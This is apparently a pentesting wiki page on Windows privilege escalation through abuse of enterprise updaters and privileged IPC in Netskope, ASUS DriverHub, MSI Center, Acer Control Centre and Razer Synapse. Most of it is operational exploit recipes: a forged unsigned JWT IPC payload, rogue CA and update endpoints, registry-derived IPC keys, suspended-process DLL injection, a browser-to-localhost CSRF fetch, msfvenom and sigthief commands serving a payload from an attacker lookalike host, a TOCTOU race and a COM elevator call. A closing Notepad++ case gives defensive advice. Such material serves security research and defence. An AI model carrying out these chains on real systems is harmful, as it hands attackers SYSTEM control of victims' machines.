_body: "# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)\n\n{{#include ../../banners/hacktricks-training.md}}\n\
  \nThis page generalizes a class of Windows local privilege escalation chains found in enterprise endpoint agents and updaters\
  \ that expose a low-friction IPC surface and a privileged update flow. A representative example is Netskope Client for Windows\
  \ < R129 (CVE-2025-0309), where a low-privileged user can coerce enrollment into an attacker-controlled server and then\
  \ deliver a malicious MSI that the SYSTEM service installs.\n\nKey ideas you can reuse against similar products:\n- Abuse\
  \ a privileged service’s localhost IPC to force re-enrollment or reconfiguration to an attacker server.\n- Implement the\
  \ vendor’s update endpoints, deliver a rogue Trusted Root CA, and point the updater to a malicious, “signed” package.\n\
  - Evade weak signer checks (CN allow-lists), optional digest flags, and lax MSI properties.\n- If IPC is “encrypted”, derive\
  \ the key/IV from world-readable machine identifiers stored in the registry.\n- If the service restricts callers by image\
  \ path/process name, inject into an allow-listed process or spawn one suspended and bootstrap your DLL via a minimal thread-context\
  \ patch.\n\n---\n## 1) Forcing enrollment to an attacker server via localhost IPC\n\nMany agents ship a user-mode UI process\
  \ that talks to a SYSTEM service over localhost TCP using JSON.\n\nObserved in Netskope:\n- UI: stAgentUI (low integrity)\
  \ ↔ Service: stAgentSvc (SYSTEM)\n- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN\n\nExploit flow:\n1) Craft a JWT\
  \ enrollment token whose claims control the backend host (e.g., AddonUrl). Use alg=None so no signature is required.\n2)\
  \ Send the IPC message invoking the provisioning command with your JWT and tenant name:\n\n```json\n{\n  \"148\": {\n  \
  \  \"idpTokenValue\": \"<JWT with AddonUrl=attacker-host; header alg=None>\",\n    \"tenantName\": \"TestOrg\"\n  }\n}\n\
  ```\n\n3) The service starts hitting your rogue server for enrollment/config, e.g.:\n- /v1/externalhost?service=enrollment\n\
  - /config/user/getbrandingbyemail\n\nNotes:\n- If caller verification is path/name-based, originate the request from an\
  \ allow-listed vendor binary (see §4).\n\n---\n## 2) Hijacking the update channel to run code as SYSTEM\n\nOnce the client\
  \ talks to your server, implement the expected endpoints and steer it to an attacker MSI. Typical sequence:\n\n1) /v2/config/org/clientconfig\
  \ → Return JSON config with a very short updater interval, e.g.:\n```json\n{\n  \"clientUpdate\": { \"updateIntervalInMin\"\
  : 1 },\n  \"check_msi_digest\": false\n}\n```\n2) /config/ca/cert → Return a PEM CA certificate. The service installs it\
  \ into the Local Machine Trusted Root store.\n3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake\
  \ version.\n\nBypassing common checks seen in the wild:\n- Signer CN allow-list: the service may only check the Subject\
  \ CN equals “netSkope Inc” or “Netskope, Inc.”. Your rogue CA can issue a leaf with that CN and sign the MSI.\n- CERT_DIGEST\
  \ property: include a benign MSI property named CERT_DIGEST. No enforcement at install.\n- Optional digest enforcement:\
  \ config flag (e.g., check_msi_digest=false) disables extra cryptographic validation.\n\nResult: the SYSTEM service installs\
  \ your MSI from\nC:\\ProgramData\\Netskope\\stAgent\\data\\*.msi\nexecuting arbitrary code as NT AUTHORITY\\SYSTEM.\n\n\
  ---\n## 3) Forging encrypted IPC requests (when present)\n\nFrom R127, Netskope wrapped IPC JSON in an encryptData field\
  \ that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:\n- Key = HKLM\\\
  SOFTWARE\\NetSkope\\Provisioning\\nsdeviceidnew\n- IV  = HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductID\n\
  \nAttackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly\
  \ “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.\n\n---\n## 4) Bypassing IPC\
  \ caller allow-lists (path/name checks)\n\nSome services try to authenticate the peer by resolving the TCP connection’s\
  \ PID and comparing the image path/name against allow-listed vendor binaries located under Program Files (e.g., stagentui.exe,\
  \ bwansvc.exe, epdlp.exe).\n\nTwo practical bypasses:\n- DLL injection into an allow-listed process (e.g., nsdiag.exe) and\
  \ proxy IPC from inside it.\n- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread\
  \ (see §5) to satisfy driver-enforced tamper rules.\n\n---\n## 5) Tamper-protection friendly injection: suspended process\
  \ + NtContinue patch\n\nProducts often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from\
  \ handles to protected processes:\n- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE,\
  \ PROCESS_SUSPEND_RESUME\n- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE\n\
  \nA reliable user-mode loader that respects these constraints:\n1) CreateProcess of a vendor binary with CREATE_SUSPENDED.\n\
  2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with\
  \ THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).\n3) Overwrite ntdll!NtContinue\
  \ (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.\n\
  4) ResumeThread to trigger your stub in-process, loading your DLL.\n\nBecause you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME\
  \ on an already-protected process (you created it), the driver’s policy is satisfied.\n\n---\n## 6) Practical tooling\n\
  - NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig,\
  \ /config/ca/cert, /v2/checkupdate.\n- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC\
  \ messages and includes the suspended-process injection to originate from an allow-listed binary.\n\n## 7) Fast triage workflow\
  \ for unknown updater/IPC surfaces\n\nWhen facing a new endpoint agent or motherboard “helper” suite, a quick workflow is\
  \ usually enough to tell whether you are looking at a promising privesc target:\n\n1) Enumerate loopback listeners and map\
  \ them back to vendor processes:\n\n```powershell\nGet-NetTCPConnection -State Listen |\n  Where-Object {$_.LocalAddress\
  \ -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |\n  Select-Object LocalAddress,LocalPort,OwningProcess,\n    @{n='Process';e={(Get-Process\
  \ -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}\n```\n\n2) Enumerate candidate named pipes:\n\n```powershell\n\
  [System.IO.Directory]::GetFiles(\"\\\\.\\pipe\\\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'\n```\n\n\
  3) Mine registry-backed routing data used by plugin-based IPC servers:\n\n```powershell\nGet-ChildItem 'HKLM:\\SOFTWARE\\\
  WOW6432Node\\MSI\\MSI Center\\Component' |\n  Select-Object PSChildName\n```\n\n4) Extract endpoint names, JSON keys, and\
  \ command IDs from the user-mode client first. Packed Electron/.NET frontends frequently leak the full schema:\n\n```powershell\n\
  Select-String -Path 'C:\\Program Files\\Vendor\\**\\*.js','C:\\Program Files\\Vendor\\**\\*.dll' `\n  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'\n\
  ```\n\n5) Hunt for the actual trust predicate, not just the code path that eventually launches the process:\n\n```powershell\n\
  Select-String -Path 'C:\\Program Files\\Vendor\\**\\*.exe','C:\\Program Files\\Vendor\\**\\*.dll','C:\\Program Files\\Vendor\\\
  **\\*.js' `\n  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'\n\
  ```\n\nPatterns worth prioritizing:\n- `CryptQueryObject`/certificate parsing without `WinVerifyTrust` usually means “certificate\
  \ exists” was treated as “certificate is trusted”, enabling certificate cloning or other fake-signer tricks.\n- Substring/suffix\
  \ checks over `Origin`, `Referer`, download URLs, process names, or signer CNs are not authentication. `contains(\".vendor.com\"\
  )` is usually exploitable with attacker-controlled lookalike domains.\n- If the low-privileged GUI decides “the file is\
  \ trusted” and the SYSTEM broker merely consumes that result, patching or reimplementing the client-side DLL/JS often bypasses\
  \ the boundary entirely (Razer-style split validation).\n- If the broker copies a payload to `%TEMP%`/`C:\\Windows\\Temp`\
  \ and then validates or schedules it from that path, immediately test for TOCTOU replacement windows and for sibling plugin\
  \ modules that expose alternate `ExecuteTask()` wrappers with weaker checks.\n\nFor named-pipe-heavy targets, PipeViewer\
  \ is a quick way to spot weak DACLs and remotely reachable pipes before you start reversing the protocol in depth.\n\nIf\
  \ the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary:\
  \ injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy\
  \ the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md)\
  \ covers the primitive in more depth.\n\n---\n## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)\n\
  \nDriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com.\
  \ The origin filter simply performs `string_contains(\".asus.com\")` over the Origin header and over download URLs exposed\
  \ by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the\
  \ check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md)\
  \ for additional bypass patterns.\n\nPractical flow:\n1) Register a domain that embeds `.asus.com` and host a malicious\
  \ webpage there.\n2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.\n\
  3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.\n\n```javascript\nfetch(\"\
  http://127.0.0.1:53000/asus/v1.0/Reboot\", {\n  method: \"POST\",\n  headers: { \"Content-Type\": \"application/json\" },\n\
  \  body: JSON.stringify({ Event: [{ Cmd: \"Reboot\" }] })\n});\n```\n\nEven the PowerShell CLI shown below succeeds when\
  \ the Origin header is spoofed to the trusted value:\n\n```powershell\nInvoke-WebRequest -Uri \"http://127.0.0.1:53000/asus/v1.0/Reboot\"\
  \ -Method Post \\\n  -Headers @{Origin=\"https://driverhub.asus.com\"; \"Content-Type\"=\"application/json\"} \\\n  -Body\
  \ (@{Event=@(@{Cmd=\"Reboot\"})}|ConvertTo-Json)\n```\n\nAny browser visit to the attacker site therefore becomes a 1-click\
  \ (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.\n\n---\n## 2) Insecure code-signing verification & certificate\
  \ cloning (ASUS UpdateApp)\n\n`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches\
  \ them in `C:\\ProgramData\\ASUS\\AsusDriverHub\\SupportTemp`. Download URL validation reuses the same substring logic,\
  \ so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the\
  \ PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.\n\
  \nTo weaponize the flow:\n1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).\n\
  2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).\n\
  3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.\n\nBecause both the\
  \ Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the\
  \ attacker binary under its elevated context.\n\n---\n## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)\n\
  \nMSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII\
  \ arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its\
  \ handler:\n1) Copies the supplied executable to `C:\\Windows\\Temp\\MSI Center SDK.exe`.\n2) Verifies the signature via\
  \ `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust`\
  \ succeeds).\n3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.\n\nThe copied\
  \ file is not locked between verification and `ExecuteTask()`. An attacker can:\n- Send Frame A pointing to a legitimate\
  \ MSI-signed binary (guarantees the signature check passes and the task is queued).\n- Race it with repeated Frame B messages\
  \ that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.\n\nWhen the scheduler\
  \ fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation\
  \ uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.\n\n---\n## 2) Abusing custom SYSTEM-level\
  \ IPC & impersonation (MSI Center + Acer Control Centre)\n\n### MSI Center TCP command sets\n- Every plugin/DLL loaded by\
  \ `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\\SOFTWARE\\MSI\\MSI_CentralServer`. The first 4 bytes\
  \ of a frame select that component, allowing attackers to route commands to arbitrary modules.\n- Plugins can define their\
  \ own task runners. `Support\\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly\
  \ calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\\Users\\\
  <user>\\Desktop\\payload.exe` and get SYSTEM execution deterministically.\n- Sniffing loopback with Wireshark or instrumenting\
  \ the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay\
  \ frames.\n\n### Acer Control Centre named pipes & impersonation levels\n- `ACCSvc.exe` (SYSTEM) exposes `\\\\.\\pipe\\\
  treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\\\TARGET\\pipe\\treadstone_service_LightMode`).\
  \ Sending command ID `7` with a file path invokes the service’s process-spawning routine.\n- The client library serializes\
  \ a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools\
  \ & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native\
  \ handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.\n\
  - Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity\
  \ SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.\n- Combine\
  \ that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without\
  \ vendor hardware.\n\nThese IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation`\
  \ filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.\n\
  \n---\n## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)\n\nRazer Synapse 4 added another\
  \ useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`,\
  \ while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside\
  \ the privileged boundary.\n\nObserved exploitation path:\n- Instantiate the COM object `RzUtility.Elevator`.\n- Call `LaunchProcessNoWait(<path>,\
  \ \"\", 1)` to request an elevated launch.\n- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched\
  \ out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.\n\nMinimal PowerShell\
  \ invocation:\n\n```powershell\n$com = New-Object -ComObject 'RzUtility.Elevator'\n$com.LaunchProcessNoWait(\"C:\\Users\\\
  Public\\payload.exe\", \"\", 1)\n```\n\nGeneral takeaway: when reversing “helper” suites, do not stop at localhost TCP or\
  \ named pipes. Check for COM classes with names such as `Elevator`, `Launcher`, `Updater`, or `Utility`, then verify whether\
  \ the privileged service actually validates the target binary itself or merely trusts a result computed by a patchable user-mode\
  \ client DLL. This pattern generalizes beyond Razer: any split design where the high-privilege broker consumes an allow/deny\
  \ decision from the low-privilege side is a candidate privesc surface.\n\n---\n## Remote supply-chain hijack via weak updater\
  \ validation (WinGUp / Notepad++)\n\nBetween June 2025 and December 2025, attackers who compromised the hosting infrastructure\
  \ behind the Notepad++ update flow selectively served malicious manifests to chosen victims. Older WinGUp-based updaters\
  \ did not fully verify update authenticity, so a hostile XML response could redirect clients to attacker-controlled URLs.\
  \ Because the client accepted HTTPS content without enforcing both a trusted certificate chain and a valid PE signature\
  \ on the downloaded installer, victims fetched and executed a trojanized NSIS `update.exe`.\n\nOperational flow (no local\
  \ exploit required):\n1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker\
  \ metadata pointing at a malicious download URL.\n2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses\
  \ two execution chains:\n   - **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe`\
  \ and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts\
  \ and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).\n   - **Scripted\
  \ shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject\
  \ shellcode and stage Cobalt Strike Beacon.\n\nHardening/detection takeaways for any auto-updater:\n- Enforce **certificate\
  \ + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update\
  \ manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.\n- Treat **BYO signed binary sideloading**\
  \ as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install\
  \ path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp\
  \ with non-vendor signatures.\n- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots):\
  \ mutex `Global\\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.\n- Notepad++\
  \ responded by strengthening WinGUp in v8.8.9 and later: the returned XML is now signed (XMLDSig), and newer builds enforce\
  \ certificate + signature verification of the downloaded installer instead of trusting the transport alone.\n\n<details>\n\
